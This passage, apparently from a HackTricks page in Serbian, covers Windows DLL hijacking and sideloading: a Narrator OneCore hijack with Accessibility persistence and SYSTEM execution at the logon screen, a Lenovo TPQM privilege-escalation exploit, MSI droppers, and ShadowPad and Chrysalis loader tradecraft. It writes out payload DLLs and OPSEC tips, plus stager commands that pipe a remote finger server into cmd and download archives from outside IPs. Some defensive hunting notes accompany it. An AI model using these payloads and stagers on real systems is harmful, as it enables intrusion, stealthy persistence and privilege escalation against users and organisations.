- Ako writable DLL pod kontrolom napadača postoji na OneCore path-u, ona se učitava i `DllMain(DLL_PROCESS_ATTACH)` se izvršava. Nisu potrebni nikakvi exports.

Otkrivanje pomoću Procmon-a
- Filter: `Process Name is Narrator.exe` i `Operation is Load Image` ili `CreateFile`.
- Pokrenite Narrator i posmatrajte pokušaj učitavanja prethodno navedenog path-a.

Minimalni DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC tišina
- Naivni hijack će govoriti/istaći UI. Da biste ostali neprimetni, prilikom attach-a enumerišite Narrator thread-ove, otvorite glavni thread (`OpenThread(THREAD_SUSPEND_RESUME)`) i suspendujte ga pomoću `SuspendThread`; nastavite izvršavanje u sopstvenom thread-u. Pogledajte PoC za kompletan kod.<sup>[[8]](#references)</sup>

Trigger i persistence putem Accessibility konfiguracije
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Uz navedeno, pokretanje Narrator-a učitava planted DLL. Na secure desktop-u (logon ekranu), pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.

RDP-triggered SYSTEM izvršavanje (lateral movement)
- Dozvolite classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Povežite se na host putem RDP-a, a na logon ekranu pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.
- Izvršavanje se zaustavlja kada se RDP session zatvori—izvršite inject/migrate bez odlaganja.

Bring Your Own Accessibility (BYOA)
- Možete klonirati ugrađeni Accessibility Tool (AT) registry entry (npr. CursorIndicator), izmeniti ga tako da pokazuje na proizvoljni binary/DLL, importovati ga, a zatim postaviti `configuration` na ime tog AT-a. Ovo prosleđuje proizvoljno izvršavanje kroz Accessibility framework.

Napomene
- Upisivanje u `%windir%\System32` i menjanje HKLM vrednosti zahteva admin prava.
- Celokupna payload logika može se nalaziti u `DLL_PROCESS_ATTACH`; exports nisu potrebni.

## Studija slučaja: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ovaj slučaj prikazuje **Phantom DLL Hijacking** u Lenovo-ovom TrackPoint Quick Menu-u (`TPQMAssistant.exe`), evidentiranom kao **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalji ranjivosti

- **Komponenta**: `TPQMAssistant.exe`, koji se nalazi u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se izvršava svakog dana u 9:30 i to u kontekstu ulogovanog user-a.
- **Dozvole direktorijuma**: `CREATOR OWNER` ima dozvolu za upis, što lokalnim user-ima omogućava da ubace proizvoljne fajlove.
- **Ponašanje DLL Search-a**: Najpre pokušava da učita `hostfxr.dll` iz svog working directory-ja i beleži "NAME NOT FOUND" ako DLL nedostaje, što ukazuje na prioritet lokalne pretrage direktorijuma.

### Implementacija exploita

Attacker može postaviti zlonamerni `hostfxr.dll` stub u isti direktorijum i iskoristiti DLL koji nedostaje za postizanje code execution-a u kontekstu user-a:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Tok napada

1. Kao standardni korisnik, postavite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da se scheduled task pokrene u 9:30 u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se task izvrši, zlonamerni DLL se pokreće u sesiji administratora sa srednjim nivoom integriteta.
4. Kombinujte standardne UAC bypass tehnike da biste prešli sa srednjeg nivoa integriteta na SYSTEM privilegije.

## Studija slučaja: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors često kombinuju MSI-based droppers sa DLL side-loading tehnikom kako bi izvršili payloads unutar pouzdanog, potpisanog procesa.<sup>[[10]](#references)</sup>

Pregled lanca
- Korisnik preuzima MSI. CustomAction se nečujno izvršava tokom GUI instalacije (npr. LaunchApplication ili VBScript akcija) i rekonstruiše sledeću fazu iz embedded resources.
- Dropper upisuje legitimni, potpisani EXE i zlonamerni DLL u isti direktorijum (primer para: Avast-signed wsc_proxy.exe + wsc.dll kojim upravlja napadač).
- Kada se potpisani EXE pokrene, Windows DLL search order prvo učitava wsc.dll iz working directory-ja, čime se izvršava kod napadača unutar signed parent procesa (ATT&CK T1574.001).

MSI analiza (šta tražiti)
- CustomAction tabela:
- Potražite unose koji pokreću izvršne datoteke ili VBScript. Primer sumnjivog obrasca: LaunchApplication koji u pozadini izvršava embedded datoteku.
- U programu Orca (Microsoft Orca.exe) pregledajte tabele CustomAction, InstallExecuteSequence i Binary.
- Embedded/split payloads u MSI CAB-u:
- Administrativno izdvajanje: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ili koristite lessmsi: lessmsi x package.msi C:\out
- Potražite više malih fragmenata koji se spajaju i dešifruju pomoću VBScript CustomAction-a. Uobičajen tok:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktični sideloading sa wsc_proxy.exe
- Postavite ove dve datoteke u isti folder:
- wsc_proxy.exe: legitiman potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
- wsc.dll: napadački DLL. Ako nisu potrebni specifični exports, DllMain može biti dovoljan; u suprotnom, napravite proxy DLL i prosledite potrebne exports genuine biblioteci, dok payload izvršavate u DllMain.
- Napravite minimalni DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Za export requirements, koristite proxying framework (npr. DLLirant/Spartacus) za generisanje forwarding DLL-a koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na razrešavanje imena DLL-a od strane host binary-ja. Ako host koristi apsolutne putanje ili safe loading flags (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack može da ne uspe.
- KnownDLLs, SxS i forwarded exports mogu uticati na prioritet i moraju se uzeti u obzir pri izboru host binary-ja i export set-a.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point je opisao kako Ink Dragon postavlja ShadowPad koristeći **three-file triad** kako bi se uklopio u legitimni software, dok core payload ostaje encrypted na disku:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – zloupotrebljavaju se vendori kao što su AMD, Realtek ili NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Napadači preimenuju executable tako da izgleda kao Windows binary (na primer `conhost.exe`), ali Authenticode signature ostaje validan.
2. **Malicious loader DLL** – postavlja se pored EXE-a sa očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binary obfuskovan pomoću ScatterBrain framework-a; njegov jedini zadatak je da pronađe encrypted blob, decrypt-uje ga i reflective map-uje ShadowPad.
3. **Encrypted payload blob** – često se čuva kao `<name>.tmp` u istom direktorijumu. Nakon memory-mapping-a decrypted payload-a, loader briše TMP file kako bi uništio forenzičke dokaze.

Tradecraft napomene:

* Preimenovanje signed EXE-a (uz zadržavanje originalnog `OriginalFileName` u PE header-u) omogućava mu da se predstavi kao Windows binary, a da zadrži vendor signature, zato imitirajte naviku Ink Dragon-a da postavlja binary-je koji izgledaju kao `conhost.exe`, a zapravo su AMD/NVIDIA utilities.
* Pošto executable ostaje trusted, većina allowlisting controls zahteva samo da se vaš malicious DLL nalazi pored njega. Fokusirajte se na prilagođavanje loader DLL-a; signed parent obično može da se izvršava bez izmena.
* ShadowPad decryptor očekuje da se TMP blob nalazi pored loader-a i da je writable kako bi mogao da obriše sadržaj file-a nakon mapping-a. Ostavite direktorijum writable dok se payload ne učita; kada se payload nađe u memoriji, TMP file može bezbedno da se obriše radi OPSEC-a.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatori kombinuju DLL sideloading sa LOLBAS tako da je jedini custom artifact na disku malicious DLL pored trusted EXE-a:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Skriveni PowerShell pokreće `cmd.exe /c`, preuzima commands sa Finger server-a i prosleđuje ih u `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` preuzima tekst preko TCP/79; `| cmd` izvršava odgovor server-a, što operatorima omogućava da rotiraju second stage server-side.

- **Built-in download/extract:** Preuzmite archive sa bezazlenom ekstenzijom, raspakujte ga i stage-ujte sideload target i DLL u nasumičan `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` skriva progress i prati redirects; `tar -xf` koristi Windows-ov ugrađeni tar.

- **WMI/CIM launch:** Pokrenite EXE preko WMI-ja tako da telemetry prikazuje CIM-created process dok on učitava colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funkcioniše sa binary-jima koji preferiraju local DLLs (npr. `intelbq.exe`, `nearby_share.exe`); payload (npr. Remcos) izvršava se pod trusted name-om.

- **Hunting:** Postavite alert na `forfiles` kada se `/p`, `/m` i `/c` pojavljuju zajedno; takva kombinacija je neuobičajena van admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Nedavni Lotus Blossom intrusion zloupotrebio je trusted update chain kako bi isporučio NSIS-packed dropper koji je stage-ovao DLL sideload i potpuno in-memory payloads.<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, postavlja preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` i encrypted blob `BluetoothService`, a zatim pokreće EXE.
- Host EXE import-uje `log.dll` i poziva `LogInit`/`LogWrite`. `LogInit` mmap-load-uje blob; `LogWrite` ga decrypt-uje pomoću custom LCG-based stream-a (konstante **0x19660D** / **0x3C6EF35F**, key material izveden iz prethodnog hash-a), prepisuje buffer plaintext shellcode-om, oslobađa temp vrednosti i skače na njega.
- Kako bi izbegao IAT, loader razrešava API-je hash-ovanjem export names pomoću **FNV-1a basis 0x811C9DC5 + prime 0x100019**, a zatim primenjuje Murmur-style avalanche (**0x85EBCA6B**) i upoređuje rezultate sa salted target hashes.

Main shellcode (Chrysalis)
- Decrypt-uje PE-like main module ponavljanjem add/XOR/sub operacija sa key-em `gQ2JR&9;` kroz pet pass-ova, a zatim dinamički učitava `Kernel32.dll` → `GetProcAddress` kako bi završio import resolution.
- Rekonstruiše DLL name strings u runtime-u pomoću per-character bit-rotate/XOR transforms, a zatim učitava `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Koristi drugi resolver koji prolazi kroz **PEB → InMemoryOrderModuleList**, parsira svaki export table u 4-byte blokovima uz Murmur-style mixing i koristi `GetProcAddress` samo kao fallback ako hash nije pronađen.

Embedded configuration & C2
- Config se nalazi unutar dropped `BluetoothService` file-a na **offsetu 0x30808** (size **0x980**) i RC4-decrypt-uje se pomoću key-a `qwhvb^435h&*7`, čime se otkrivaju C2 URL i User-Agent.
- Beacons formiraju dot-delimited host profile, dodaju tag `4Q` na početak, a zatim ga RC4-encrypt-uju key-em `vAuig34%^325hGV` pre `HttpSendRequestA` preko HTTPS-a. Responses se RC4-decrypt-uju i dispatch-uju pomoću tag switch-a (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode se kontroliše CLI args-ima: bez args = install persistence (service/Run key) koja pokazuje na `-i`; `-i` ponovo pokreće self sa `-k`; `-k` preskače install i pokreće payload.

Alternate loader observed
- Isti intrusion je postavio Tiny C Compiler i izvršio `svchost.exe -nostdlib -run conf.c` iz `C:\ProgramData\USOShared\`, sa `libtcc.dll` pored njega. C source koji je dostavio attacker sadržao je embedded shellcode, bio je kompajliran i izvršavan in-memory bez upisivanja PE-a na disk. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ova TCC-based compile-and-run faza je u runtime-u importovala `Wininet.dll` i preuzimala second-stage shellcode sa hardkodovanog URL-a, obezbeđujući fleksibilan loader koji se predstavlja kao pokretanje compilera.

## Sideloading potpisanog hosta sa export proxying-om + parkiranjem host thread-a

Neki DLL sideloading lanci dodaju **stability engineering** kako bi legitimni host ostao aktivan dovoljno dugo da uredno učita kasnije faze, umesto da se sruši nakon učitavanja malicioznog DLL-a.<sup>[[11]](#references)</sup>

Observed pattern
- Postavite trusted EXE pored malicioznog DLL-a koristeći očekivano ime dependency-ja, kao što je `version.dll`.
- Maliciozni DLL **proxy-je svaki očekivani export** ka pravom system DLL-u (na primer `%SystemRoot%\\System32\\version.dll`), tako da resolution import-a i dalje uspeva, a host process nastavlja da radi.
- Nakon učitavanja, maliciozni DLL **patch-uje entry point hosta** tako da se main thread zaglavi u beskonačnoj `Sleep` petlji, umesto da se završi ili izvrši code paths koji bi terminirali process.
- Novi thread obavlja stvarni maliciozni posao: dešifruje ime ili putanju next-stage DLL-a (RC4/XOR su uobičajeni), a zatim ga pokreće pomoću `LoadLibrary`.

Why this matters
- Normalno DLL proxying čuva API compatibility, ali ne garantuje da će host ostati aktivan dovoljno dugo za kasnije faze.
- Parkiranje main thread-a u `Sleep(INFINITE)` je jednostavan način da signed process ostane rezidentan dok loader obavlja dešifrovanje, staging ili network bootstrap u worker thread-u.
- Hunting isključivo za sumnjivim `DllMain` može da propusti ovaj pattern ako se interesantno ponašanje dešava nakon patch-ovanja entry point-a hosta i pokretanja secondary thread-a.

Minimal workflow
1. Kopirajte signed host EXE i utvrdite koji DLL učitava iz lokalnog direktorijuma.
2. Napravite proxy DLL koji export-uje iste funkcije i forward-uje ih ka legitimnom DLL-u.
3. U `DllMain(DLL_PROCESS_ATTACH)` kreirajte worker thread.
4. Iz tog thread-a patch-ujte entry point hosta ili start routine main thread-a tako da se izvršavanje vrti u petlji sa `Sleep`.
5. Dešifrujte ime/config next-stage DLL-a i pozovite `LoadLibrary` ili izvršite manual-map payload-a.

Defensive pivots
- Signed processes koji učitavaju `version.dll` ili slične uobičajene libraries iz sopstvenog application directory-ja umesto iz `System32`.
- Memory patches na process entry point-u ubrzo nakon image load-a, naročito jump-ovi/call-ovi preusmereni na `Sleep`/`SleepEx`.
- Threads koje kreira proxy DLL i koji odmah pozivaju `LoadLibrary` nad drugim DLL-om sa dešifrovanim imenom.
- Full-export proxy DLL-ovi postavljeni pored vendor executable-a unutar writable staging direktorijuma kao što su `ProgramData`, `%TEMP%` ili putanje sa unpacked archive-ima.

## References

- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Simple C example.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
